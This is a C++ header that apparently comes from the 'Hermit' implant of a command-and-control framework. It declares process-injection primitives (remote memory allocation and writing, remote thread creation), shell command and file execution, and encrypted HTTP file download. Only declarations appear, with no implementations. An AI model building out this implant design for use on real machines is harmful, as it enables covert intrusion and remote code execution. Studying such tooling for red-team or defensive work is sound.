#ifndef HERMIT_CORE_SYSTEM_HPP
#define HERMIT_CORE_SYSTEM_HPP

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <tlhelp32.h>
#include <vector>

#include "core/crypt.hpp"
#include "core/procs.hpp"
#include "core/stdout.hpp"
#include "core/utils.hpp"

namespace System::Arch
{
    std::wstring GetName(WORD wProcessorArchitecture);
}

namespace System::Env
{
    std::wstring GetStrings(const std::wstring& envVar);
}

namespace System::Process
{
    HANDLE ProcessCreate(
        Procs::PPROCS   pProcs,
        LPCWSTR         lpApplicationName,
        DWORD           dwDesiredAccess, // e.g. PROCESS_ALL_ACCESS
        HANDLE          hParentProcess
    );
    DWORD GetProcessIdByName(LPCWSTR lpProcessName);
    HANDLE ProcessOpen(
        Procs::PPROCS   pProcs,
        DWORD           dwProcessID,
        DWORD           dwDesiredAccess
    );
    BOOL ProcessTerminate(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        NTSTATUS        ntStatus
    );
    PVOID VirtualMemoryAllocate(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        DWORD           dwSize,
        DWORD           dwAllocationType,   // e.g. MEM_COMMIT | MEM_RESERVE
        DWORD           dwProtect           // e.g. PAGE_READWRITE
    );
    BOOL VirtualMemoryFree(
        Procs::PPROCS   pProcs,
        HANDLE 	        hProcess,
		PVOID* 	        lpBaseAddr,
		SIZE_T 	        dwSize,
		DWORD 	        dwFreeType
    );
    BOOL VirtualMemoryWrite(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        LPVOID          lpBaseAddr,
        LPVOID          lpBuffer,
		DWORD           dwBufferSize,
        PDWORD 			lpNumberOfBytesWritten
    );
    HANDLE RemoteThreadCreate(
        Procs::PPROCS           pProcs,
        HANDLE                  hProcess,
        LPTHREAD_START_ROUTINE 	lpThreadStartRoutineAddr,
        PVOID                   pArgument
    );

    std::wstring ExecuteCmd(Procs::PPROCS pProcs, const std::wstring& wCmd);
    BOOL ExecuteFile(Procs::PPROCS pProcs, const std::wstring& wFilePath);
}

namespace System::Fs
{
    std::wstring GetAbsolutePath(
        const std::wstring& wPath,
        BOOL bExtendLength
    );
    HANDLE CreateNewFile(
        Procs::PPROCS pProcs,
        const std::wstring& wFilePath
    );
    BOOL WriteBytesToFile(
        Procs::PPROCS               pProcs,
        const std::wstring&         wFilePath,
        const std::vector<BYTE>&    bytes
    );
}

namespace System::Http
{
    struct WinHttpHandlers {
        HINTERNET hSession;
        HINTERNET hConnect;
    };

    struct WinHttpResponse {
        BOOL bResult;
        HINTERNET hRequest;
        DWORD dwStatusCode;
    };

    WinHttpHandlers InitRequest(
        Procs::PPROCS pProcs,
        LPCWSTR lpHost,
        INTERNET_PORT nPort
    );
    WinHttpResponse SendRequest(
        Procs::PPROCS pProcs,
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        LPCWSTR lpMethod,
        LPCWSTR lpHeaders,
        LPVOID lpData,
        DWORD dwDataLength
    );
    std::vector<BYTE> ReadResponseBytes(
        Procs::PPROCS pProcs,
        HINTERNET hRequest
    );
    std::wstring ReadResponseText(
        Procs::PPROCS pProcs,
        HINTERNET hRequest
    );
    BOOL DownloadFile(
        Procs::PPROCS pProcs,
        Crypt::PCRYPT pCrypt,
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        LPCWSTR lpHeaders,
        const std::wstring& wInfoJSON,
        const std::wstring& wDest
    );
    VOID WinHttpCloseHandles(
        Procs::PPROCS pProcs,
        HINTERNET hSession,
        HINTERNET hConnect,
        HINTERNET hRequest
    );
}

#endif // HERMIT_CORE_SYSTEM_HPP